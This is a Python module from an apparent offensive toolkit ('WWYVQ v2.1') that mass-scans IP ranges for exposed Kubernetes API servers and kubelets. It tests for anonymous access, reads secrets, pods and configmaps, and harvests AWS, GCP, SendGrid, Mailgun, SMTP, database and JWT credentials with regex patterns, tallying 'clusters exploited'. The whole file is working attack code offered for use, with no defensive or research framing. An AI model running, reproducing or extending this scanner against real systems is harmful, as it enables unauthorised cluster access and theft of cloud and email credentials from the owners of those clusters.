#!/usr/bin/env python3
"""
WWYVQ v2.1 Kubernetes Exploit Module
Advanced Kubernetes cluster exploitation

Author: wKayaa
Date: 2025-01-07
"""

import asyncio
import json
import ssl
from typing import Dict, List, Any, Optional, Tuple
from urllib.parse import urlparse, urljoin
from datetime import datetime
import ipaddress
import re

from .base_exploit import BaseExploitModule, ExploitResult


class KubernetesExploitModule(BaseExploitModule):
    """
    Advanced Kubernetes Exploitation Module
    Focus on K8s cluster discovery and exploitation
    """
    
    def __init__(self):
        super().__init__(
            name="KubernetesExploit",
            description="Advanced Kubernetes cluster exploitation and secret harvesting"
        )
        
        # K8s specific configurations
        self.k8s_ports = [6443, 8443, 8080, 10250, 10251, 10252, 10255, 10256]
        self.k8s_paths = [
            "/api/v1",
            "/apis",
            "/version",
            "/metrics",
            "/logs",
            "/stats",
            "/pods",
            "/secrets",
            "/configmaps",
            "/services",
            "/endpoints"
        ]
        
        # Credential patterns
        self.credential_patterns = {
            'aws_access_key': re.compile(r'AKIA[0-9A-Z]{16}'),
            'aws_secret_key': re.compile(r'[0-9a-zA-Z/+=]{40}'),
            'gcp_service_account': re.compile(r'"type": "service_account"'),
            'kubernetes_token': re.compile(r'[A-Za-z0-9\-_]{20,}'),
            'docker_config': re.compile(r'"auths":\s*{'),
            'sendgrid_key': re.compile(r'SG\.[0-9A-Za-z\-_]{22}\.[0-9A-Za-z\-_]{43}'),
            'mailgun_key': re.compile(r'key-[0-9a-fA-F]{32}'),
            'smtp_password': re.compile(r'smtp.*password.*[:=]\s*["\']?([^"\'\\s]+)'),
            'database_url': re.compile(r'[a-zA-Z][a-zA-Z0-9+.-]*://[^\\s]+'),
            'jwt_secret': re.compile(r'[A-Za-z0-9\-_]{32,}')
        }
        
        # Vulnerability signatures
        self.vulnerability_signatures = {
            'anonymous_access': ['system:anonymous', 'unauthorized access'],
            'privileged_pods': ['privileged: true', 'securityContext'],
            'exposed_secrets': ['password', 'token', 'key', 'secret'],
            'insecure_communication': ['http://', 'insecure'],
            'weak_rbac': ['cluster-admin', 'system:masters']
        }
    
    async def execute_async(self, context: Dict[str, Any]) -> Dict[str, Any]:
        """Execute Kubernetes exploitation asynchronously"""
        try:
            job_config = context.get('config')
            if not job_config:
                raise ValueError("Missing job configuration")
            
            targets = job_config.targets
            max_concurrent = job_config.max_concurrent
            
            self.logger.info(f"üéØ Starting Kubernetes exploitation on {len(targets)} targets")
            
            # Expand CIDR ranges if needed
            expanded_targets = await self._expand_targets(targets)
            
            # Process targets in batches
            results = await self._process_targets_batch(expanded_targets, context, max_concurrent)
            
            # Aggregate results
            aggregated = self._aggregate_results(results)
            
            self.logger.info(f"‚úÖ Kubernetes exploitation complete: {aggregated}")
            return aggregated
            
        except Exception as e:
            self.logger.error(f"‚ùå Kubernetes exploitation failed: {e}")
            return {'error': str(e)}
    
    def execute(self, context: Dict[str, Any]) -> Dict[str, Any]:
        """Execute Kubernetes exploitation synchronously"""
        return asyncio.run(self.execute_async(context))
    
    async def _scan_target_impl(self, target: str, context: Dict[str, Any]) -> ExploitResult:
        """Implementation of Kubernetes target scanning"""
        try:
            self.logger.debug(f"üîç Scanning Kubernetes target: {target}")
            
            # Parse target
            parsed = urlparse(target if '://' in target else f'http://{target}')
            host = parsed.hostname or target
            port = parsed.port
            
            # Discover K8s services
            k8s_services = await self._discover_k8s_services(host, port)
            
            if not k8s_services:
                return ExploitResult(
                    success=False,
                    target=target,
                    module_name=self.name,
                    details={'message': 'No Kubernetes services found'}
                )
            
            # Exploit discovered services
            credentials = []
            vulnerabilities = []
            
            for service in k8s_services:
                service_creds, service_vulns = await self._exploit_k8s_service(service, context)
                credentials.extend(service_creds)
                vulnerabilities.extend(service_vulns)
            
            return ExploitResult(
                success=len(credentials) > 0 or len(vulnerabilities) > 0,
                target=target,
                module_name=self.name,
                details={
                    'services_found': len(k8s_services),
                    'services': k8s_services
                },
                credentials_found=credentials,
                vulnerabilities=vulnerabilities
            )
            
        except Exception as e:
            self.logger.error(f"‚ùå Error scanning Kubernetes target {target}: {e}")
            return ExploitResult(
                success=False,
                target=target,
                module_name=self.name,
                error_message=str(e)
            )
    
    async def _discover_k8s_services(self, host: str, port: Optional[int] = None) -> List[Dict[str, Any]]:
        """Discover Kubernetes services on a host"""
        services = []
        
        try:
            # Test ports
            ports_to_test = [port] if port else self.k8s_ports
            
            for test_port in ports_to_test:
                try:
                    # Test HTTP and HTTPS
                    for protocol in ['http', 'https']:
                        base_url = f"{protocol}://{host}:{test_port}"
                        
                        # Test if it's a K8s API server
                        if await self._is_k8s_api_server(base_url):
                            services.append({
                                'type': 'api_server',
                                'url': base_url,
                                'port': test_port,
                                'protocol': protocol
                            })
                        
                        # Test if it's a kubelet
                        elif await self._is_kubelet(base_url):
                            services.append({
                                'type': 'kubelet',
                                'url': base_url,
                                'port': test_port,
                                'protocol': protocol
                            })
                
                except Exception as e:
                    self.logger.debug(f"Error testing port {test_port}: {e}")
                    continue
        
        except Exception as e:
            self.logger.error(f"‚ùå Error discovering K8s services on {host}: {e}")
        
        return services
    
    async def _is_k8s_api_server(self, base_url: str) -> bool:
        """Check if URL is a Kubernetes API server"""
        try:
            # Simple check - try to access /version endpoint
            import aiohttp
            
            timeout = aiohttp.ClientTimeout(total=10)
            connector = aiohttp.TCPConnector(ssl=False, limit=10)
            
            async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
                async with session.get(f"{base_url}/version") as response:
                    if response.status == 200:
                        text = await response.text()
                        return 'kubernetes' in text.lower() or 'gitVersion' in text
                    return False
        
        except Exception:
            return False
    
    async def _is_kubelet(self, base_url: str) -> bool:
        """Check if URL is a kubelet"""
        try:
            import aiohttp
            
            timeout = aiohttp.ClientTimeout(total=10)
            connector = aiohttp.TCPConnector(ssl=False, limit=10)
            
            async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
                async with session.get(f"{base_url}/metrics") as response:
                    if response.status == 200:
                        text = await response.text()
                        return 'kubelet' in text.lower()
                    return False
        
        except Exception:
            return False
    
    async def _exploit_k8s_service(self, service: Dict[str, Any], context: Dict[str, Any]) -> Tuple[List[Dict[str, Any]], List[str]]:
        """Exploit a discovered Kubernetes service"""
        credentials = []
        vulnerabilities = []
        
        try:
            service_type = service.get('type')
            base_url = service.get('url')
            
            if service_type == 'api_server':
                creds, vulns = await self._exploit_api_server(base_url, context)
                credentials.extend(creds)
                vulnerabilities.extend(vulns)
            
            elif service_type == 'kubelet':
                creds, vulns = await self._exploit_kubelet(base_url, context)
                credentials.extend(creds)
                vulnerabilities.extend(vulns)
        
        except Exception as e:
            self.logger.error(f"‚ùå Error exploiting K8s service {service}: {e}")
        
        return credentials, vulnerabilities
    
    async def _exploit_api_server(self, base_url: str, context: Dict[str, Any]) -> Tuple[List[Dict[str, Any]], List[str]]:
        """Exploit Kubernetes API server"""
        credentials = []
        vulnerabilities = []
        
        try:
            import aiohttp
            
            timeout = aiohttp.ClientTimeout(total=30)
            connector = aiohttp.TCPConnector(ssl=False, limit=10)
            
            async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
                
                # Test anonymous access
                try:
                    async with session.get(f"{base_url}/api/v1/namespaces") as response:
                        if response.status == 200:
                            vulnerabilities.append("Anonymous access to namespaces API")
                            
                            # Try to access secrets
                            async with session.get(f"{base_url}/api/v1/secrets") as secret_response:
                                if secret_response.status == 200:
                                    vulnerabilities.append("Anonymous access to secrets API")
                                    secrets_data = await secret_response.text()
                                    
                                    # Extract credentials from secrets
                                    extracted_creds = self._extract_credentials_from_text(secrets_data)
                                    credentials.extend(extracted_creds)
                
                except Exception as e:
                    self.logger.debug(f"Anonymous access test failed: {e}")
                
                # Test common paths
                for path in self.k8s_paths:
                    try:
                        async with session.get(f"{base_url}{path}") as response:
                            if response.status == 200:
                                content = await response.text()
                                
                                # Extract credentials from response
                                extracted_creds = self._extract_credentials_from_text(content)
                                credentials.extend(extracted_creds)
                                
                                # Check for vulnerabilities
                                for vuln_type, signatures in self.vulnerability_signatures.items():
                                    for signature in signatures:
                                        if signature in content.lower():
                                            vulnerabilities.append(f"{vuln_type}: {signature}")
                    
                    except Exception as e:
                        self.logger.debug(f"Path {path} test failed: {e}")
                        continue
        
        except Exception as e:
            self.logger.error(f"‚ùå Error exploiting API server {base_url}: {e}")
        
        return credentials, vulnerabilities
    
    async def _exploit_kubelet(self, base_url: str, context: Dict[str, Any]) -> Tuple[List[Dict[str, Any]], List[str]]:
        """Exploit kubelet"""
        credentials = []
        vulnerabilities = []
        
        try:
            import aiohttp
            
            timeout = aiohttp.ClientTimeout(total=30)
            connector = aiohttp.TCPConnector(ssl=False, limit=10)
            
            async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
                
                # Test common kubelet paths
                kubelet_paths = ['/pods', '/stats', '/logs', '/metrics']
                
                for path in kubelet_paths:
                    try:
                        async with session.get(f"{base_url}{path}") as response:
                            if response.status == 200:
                                content = await response.text()
                                
                                # Extract credentials
                                extracted_creds = self._extract_credentials_from_text(content)
                                credentials.extend(extracted_creds)
                                
                                # Check for vulnerabilities
                                if 'privileged' in content.lower():
                                    vulnerabilities.append("Privileged containers detected")
                                
                                if 'hostNetwork' in content:
                                    vulnerabilities.append("Host network access detected")
                    
                    except Exception as e:
                        self.logger.debug(f"Kubelet path {path} test failed: {e}")
                        continue
        
        except Exception as e:
            self.logger.error(f"‚ùå Error exploiting kubelet {base_url}: {e}")
        
        return credentials, vulnerabilities
    
    def _extract_credentials_from_text(self, text: str) -> List[Dict[str, Any]]:
        """Extract credentials from text using regex patterns"""
        credentials = []
        
        try:
            for cred_type, pattern in self.credential_patterns.items():
                matches = pattern.findall(text)
                for match in matches:
                    credentials.append({
                        'type': cred_type,
                        'value': match,
                        'confidence': 85.0,
                        'source': 'kubernetes_exploit',
                        'timestamp': datetime.utcnow().isoformat()
                    })
        
        except Exception as e:
            self.logger.error(f"‚ùå Error extracting credentials: {e}")
        
        return credentials
    
    async def _expand_targets(self, targets: List[str]) -> List[str]:
        """Expand CIDR ranges to individual IPs"""
        expanded = []
        
        for target in targets:
            try:
                # Check if it's a CIDR range
                if '/' in target:
                    network = ipaddress.ip_network(target, strict=False)
                    # Limit to avoid huge ranges
                    if network.num_addresses > 1000:
                        self.logger.warning(f"‚ö†Ô∏è Large CIDR range {target}, sampling 100 IPs")
                        hosts = list(network.hosts())[:100]
                    else:
                        hosts = list(network.hosts())
                    
                    expanded.extend([str(host) for host in hosts])
                else:
                    expanded.append(target)
            
            except Exception as e:
                self.logger.error(f"‚ùå Error expanding target {target}: {e}")
                expanded.append(target)
        
        return expanded
    
    async def _process_targets_batch(self, targets: List[str], context: Dict[str, Any], max_concurrent: int) -> List[ExploitResult]:
        """Process targets in batches"""
        results = []
        
        # Process in batches to avoid overwhelming the system
        batch_size = min(max_concurrent, 20)
        
        for i in range(0, len(targets), batch_size):
            batch = targets[i:i+batch_size]
            batch_results = await self.process_batch(batch, context)
            results.extend(batch_results)
            
            # Small delay between batches
            await asyncio.sleep(0.1)
        
        return results
    
    def _aggregate_results(self, results: List[ExploitResult]) -> Dict[str, Any]:
        """Aggregate exploitation results"""
        aggregated = {
            'clusters_found': 0,
            'clusters_exploited': 0,
            'credentials_found': 0,
            'vulnerabilities_found': 0,
            'targets_processed': len(results),
            'successful_exploits': 0,
            'failed_exploits': 0,
            'credentials': [],
            'vulnerabilities': []
        }
        
        for result in results:
            if result.success:
                aggregated['successful_exploits'] += 1
                
                # Check if it's a cluster
                if result.details.get('services_found', 0) > 0:
                    aggregated['clusters_found'] += 1
                    
                    if result.credentials_found or result.vulnerabilities:
                        aggregated['clusters_exploited'] += 1
                
                # Count credentials and vulnerabilities
                aggregated['credentials_found'] += len(result.credentials_found)
                aggregated['vulnerabilities_found'] += len(result.vulnerabilities)
                
                # Store credentials and vulnerabilities
                aggregated['credentials'].extend(result.credentials_found)
                aggregated['vulnerabilities'].extend(result.vulnerabilities)
            else:
                aggregated['failed_exploits'] += 1
        
        return aggregated
    
    def get_scan_paths(self) -> List[str]:
        """Get Kubernetes specific scan paths"""
        return self.k8s_paths
    
    def get_supported_protocols(self) -> List[str]:
        """Get supported protocols"""
        return ["http", "https"]
    
    def validate_target(self, target: str) -> bool:
        """Validate if target is suitable for K8s exploitation"""
        # Accept IP addresses, hostnames, and URLs
        if '://' in target:
            return True
        
        # Check if it's an IP address
        try:
            ipaddress.ip_address(target)
            return True
        except ValueError:
            pass
        
        # Check if it's a CIDR range
        if '/' in target:
            try:
                ipaddress.ip_network(target, strict=False)
                return True
            except ValueError:
                pass
        
        # Check if it's a hostname
        return bool(re.match(r'^[a-zA-Z0-9.-]+$', target))